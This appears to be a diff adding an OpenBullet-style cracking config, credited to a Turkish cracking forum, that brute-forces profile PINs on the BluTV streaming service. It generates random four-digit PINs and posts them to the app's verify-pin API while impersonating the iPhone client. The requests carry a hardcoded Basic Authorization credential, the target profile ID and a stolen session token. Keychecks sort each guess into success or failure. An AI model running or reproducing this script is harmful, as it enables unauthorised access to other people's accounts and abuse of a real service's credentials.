@@ -1,0 +1,99 @@
+﻿[SETTINGS]
+{
+  "Name": "BluTV PIN BruteForce IOS",
+  "SuggestedBots": 39,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-29T16:46:16.3439299+03:00",
+  "AdditionalInfo": "Config Proxyless Mevcuttur. // CrackTurkey.com - 🔥 Royalist Baba 🔥 \\",
+  "Author": "SCRİPTHUB",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Numeric",
+  "AllowedWordlist2": "Numeric",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Profil ID ?",
+      "VariableName": "id",
+      "Id": 2002961936
+    },
+    {
+      "Description": "Cookie [token_a] ?",
+      "VariableName": "token",
+      "Id": 1864840081
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#RandomGen FUNCTION RandomString "?d?d?d?d" -> CAP "num" 
+
+#DeviceID FUNCTION GenerateGUID -> VAR "id2" 
+
+#Login REQUEST POST "https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/profiles/verify-pin?profileId=<id>" 
+  CONTENT "{\"pin\":\"<num>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: adapter.blupoint.io" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Devicename: Royalist Baba iPhone'u" 
+  HEADER "Authorization: Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6" 
+  HEADER "Accept: */*" 
+  HEADER "Appversion: 6.9.3" 
+  HEADER "Captchatoken: " 
+  HEADER "Accept-Language: tr-TR" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Deviceresolution: 750x1334" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Deviceid: <id2>" 
+  HEADER "User-Agent: BluTV/6.9.3 (com.dsmart.D-Smart-BLU-iPhone; build:1; iOS 15.4.1) Alamofire/5.4.4" 
+  HEADER "Content-Length: 14" 
+  HEADER "Appplatform: com.blu.phone.iphone" 
+  HEADER "Authorizationtoken: <token>" 
+  HEADER "Connection: close" 
+
+#Kontrol KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errors.invalidPinError" 
+    KEY "Girilen PIN hatalıdır" 
+  KEYCHAIN Success OR 
+    KEY "[{\"verifyPin\":{\"verified\":true,\"_" 
+    KEY "status\":200,\"_" 
+    KEY "status_text\":\"OK\"}},{\"_" 
+
+#Config_By FUNCTION Constant "🔥 Royalist Baba 🔥" -> CAP "Config Made By" 
+
